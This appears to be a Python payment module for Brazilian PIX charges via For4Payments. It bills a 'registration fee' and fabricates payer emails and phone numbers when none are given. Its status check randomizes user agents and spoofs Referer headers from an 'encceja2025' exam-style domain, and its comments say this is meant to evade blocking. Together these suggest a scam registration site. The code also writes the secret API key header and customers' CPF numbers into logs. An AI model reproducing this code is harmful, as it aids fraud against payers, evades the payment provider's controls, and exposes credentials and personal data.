import os
import requests
from datetime import datetime
from flask import current_app
from typing import Dict, Any, Optional
import random
import string

class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def _generate_random_email(self, name: str) -> str:
        clean_name = ''.join(e.lower() for e in name if e.isalnum())
        random_num = ''.join(random.choices(string.digits, k=4))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        domain = random.choice(domains)
        return f"{clean_name}{random_num}@{domain}"

    def _generate_random_phone(self) -> str:
        ddd = str(random.randint(11, 99))
        number = ''.join(random.choices(string.digits, k=8))
        return f"{ddd}{number}"

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Create a PIX payment request"""
        if not self.secret_key or len(self.secret_key) < 10:
            raise ValueError("Token de autenticação inválido")

        required_fields = ['name', 'email', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                raise ValueError(f"Campo obrigatório ausente: {field}")

        try:
            amount_in_cents = int(float(data['amount']) * 100)
            if amount_in_cents <= 0:
                raise ValueError("Valor do pagamento deve ser maior que zero")

            cpf = ''.join(filter(str.isdigit, data['cpf']))
            if len(cpf) != 11:
                raise ValueError("CPF inválido")

            email = data.get('email')
            if not email or '@' not in email:
                email = self._generate_random_email(data['name'])

            # Use the provided phone number if it exists, otherwise generate random
            phone = data.get('phone')
            if not phone or len(phone.strip()) < 10:
                phone = self._generate_random_phone()
                current_app.logger.info(f"Telefone não fornecido ou inválido, gerando aleatório: {phone}")
            else:
                # Remove any non-digit characters from the phone
                phone = ''.join(filter(str.isdigit, phone))
                current_app.logger.info(f"Usando telefone fornecido pelo usuário: {phone}")

            payment_data = {
                "name": data['name'],
                "email": email,
                "cpf": cpf,
                "phone": phone,
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Taxa de Cadastro",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": True
                }]
            }

            current_app.logger.info(f"Request payload: {payment_data}")
            current_app.logger.info(f"Headers: {self._get_headers()}")

            current_app.logger.info("Enviando requisição para API For4Payments...")

            try:
                response = requests.post(
                    f"{self.API_URL}/transaction.purchase",
                    json=payment_data,
                    headers=self._get_headers(),
                    timeout=30
                )

                current_app.logger.info(f"Resposta recebida (Status: {response.status_code})")
                current_app.logger.debug(f"Resposta completa: {response.text}")

                if response.status_code == 200:
                    response_data = response.json()
                    current_app.logger.info(f"Resposta da API: {response_data}")

                    return {
                        'id': response_data.get('id') or response_data.get('transactionId'),
                        'pixCode': response_data.get('pixCode') or response_data.get('pix', {}).get('code'),
                        'pixQrCode': response_data.get('pixQrCode') or response_data.get('pix', {}).get('qrCode'),
                        'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                        'status': response_data.get('status', 'pending')
                    }
                elif response.status_code == 401:
                    current_app.logger.error("Erro de autenticação com a API For4Payments")
                    raise ValueError("Falha na autenticação com a API For4Payments. Verifique a chave de API.")
                else:
                    error_message = 'Erro ao processar pagamento'
                    try:
                        error_data = response.json()
                        if isinstance(error_data, dict):
                            error_message = error_data.get('message') or error_data.get('error') or '; '.join(error_data.get('errors', []))
                            current_app.logger.error(f"Erro da API For4Payments: {error_message}")
                    except Exception as e:
                        error_message = f'Erro ao processar pagamento (Status: {response.status_code})'
                        current_app.logger.error(f"Erro ao processar resposta da API: {str(e)}")
                    raise ValueError(error_message)

            except requests.exceptions.RequestException as e:
                current_app.logger.error(f"Erro de conexão com a API For4Payments: {str(e)}")
                raise ValueError("Erro de conexão com o serviço de pagamento. Tente novamente em alguns instantes.")

        except ValueError as e:
            current_app.logger.error(f"Erro de validação: {str(e)}")
            raise
        except Exception as e:
            current_app.logger.error(f"Erro inesperado ao processar pagamento: {str(e)}")
            raise ValueError("Erro interno ao processar pagamento. Por favor, tente novamente.")

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            current_app.logger.info(f"[PROD] Verificando status do pagamento {payment_id}")
            
            # Gerar headers aleatórios para evitar bloqueios
            import random
            import time
            
            # Lista de user agents para variar os headers
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
                "Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
            ]
            
            # Lista de idiomas para variar nos headers
            languages = [
                "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7",
                "es-ES,es;q=0.9,pt;q=0.8,en;q=0.7",
                "fr-FR,fr;q=0.9,en;q=0.8,pt-BR;q=0.7",
                "de-DE,de;q=0.9,en;q=0.8,pt;q=0.7"
            ]
            
            # Lista de possíveis referers para diversificar
            referers = [
                "https://encceja2025.com.br/obrigado",
                "https://encceja2025.com.br/thank_you",
                "https://encceja2025.com.br/inscricao-sucesso",
                "https://encceja2025.com.br/pagamento"
            ]
            
            # Gerar um ID único para cada requisição para evitar padrões
            unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            
            # Configurar headers extras aleatórios
            extra_headers = {
                "User-Agent": random.choice(user_agents),
                "Accept-Language": random.choice(languages),
                "Cache-Control": random.choice(["max-age=0", "no-cache"]),
                "X-Requested-With": "XMLHttpRequest",
                "X-Cache-Buster": str(int(time.time() * 1000)),
                "X-Request-ID": unique_id,
                "Referer": random.choice(referers),
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty"
            }
            
            # Combinar com headers base
            headers = self._get_headers()
            headers.update(extra_headers)
            
            current_app.logger.info(f"Usando headers aleatórios para For4Payments API - verificação de status")
            
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=headers,
                timeout=30
            )

            current_app.logger.info(f"Status check response (Status: {response.status_code})")
            current_app.logger.debug(f"Status check response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                current_app.logger.info(f"Payment data received: {payment_data}")

                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING').upper()
                mapped_status = status_mapping.get(current_status, 'pending')

                current_app.logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")

                return {
                    'status': mapped_status,
                    'original_status': current_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode')
                }
            elif response.status_code == 404:
                current_app.logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending', 'original_status': 'PENDING'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                current_app.logger.error(error_message)
                return {'status': 'pending', 'original_status': 'PENDING'}

        except Exception as e:
            current_app.logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending', 'original_status': 'PENDING'}

def create_payment_api(secret_key: Optional[str] = None) -> For4PaymentsAPI:
    """Factory function to create For4PaymentsAPI instance"""
    if secret_key is None:
        secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY")
        if not secret_key:
            raise ValueError("FOR4PAYMENTS_SECRET_KEY não configurada no ambiente")
    return For4PaymentsAPI(secret_key)